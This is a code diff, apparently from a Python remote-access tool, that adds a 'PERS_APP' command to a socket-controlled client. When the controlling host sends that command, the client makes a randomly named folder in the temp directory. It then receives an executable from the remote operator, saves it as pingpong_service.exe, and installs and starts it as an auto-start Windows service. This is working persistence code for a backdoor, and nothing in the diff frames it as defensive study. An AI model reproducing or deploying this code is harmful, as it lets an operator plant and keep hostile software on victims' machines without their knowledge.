@@ -288,6 +288,46 @@ def PINGPONG_client_T(ip, port):
                 s.send(printout)
                 s.recv(1024)
 #getinformation_END_location
+#persistence_START_location
+            elif data.decode() == 'PERS_APP':
+                import tempfile
+                from random import randint
+                from win32process import CreateProcess, CREATE_NO_WINDOW, STARTUPINFO
+                import os,sys
+                import win32api
+                s.send(bytes('OK', 'utf8'))
+                def generate_random_str(randomlength=16):
+                    random_str =''
+                    base_str ='ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
+                    length =len(base_str) -1
+                    for i in range(randomlength):
+                        random_str +=base_str[randint(0, length)]
+                    return random_str
+                dir_name = generate_random_str()
+                pingpong_dir = os.path.join(tempfile.gettempdir(), dir_name)
+                if os.path.exists(pingpong_dir):
+                    shutil.rmtree(pingpong_dir)
+                os.mkdir(pingpong_dir)
+                s.send(bytes(pingpong_dir, 'utf8'))
+                choose = s.recv(1024)
+                if choose == b'BACK':
+                    continue
+                pingpongservice_len = int(s.recv(1024).decode('utf8'))
+                s.send(bytes('OOKK', 'utf8'))
+                pingpongservice = s.recv(pingpongservice_len)
+                with open(f'{pingpong_dir}\\pingpong_service.exe', 'wb') as f:
+                    f.write(pingpongservice)
+                s.send(b'OK')
+                from subprocess import Popen
+                def start(dir):
+                    tmp_dir = tempfile.gettempdir()
+                    Popen(f"{tmp_dir}\\{dir}\\pingpong_service.exe --startup=auto install", shell=True)
+                    Popen(f"{tmp_dir}\\{dir}\\pingpong_service.exe start", shell=True)
+                start(dir_name)
+                s.send(b'OK')
+
+                
+#persistence_END_location
 #exit_START_location
             else:
                 s.send(bytes("Unfound", 'utf8'))
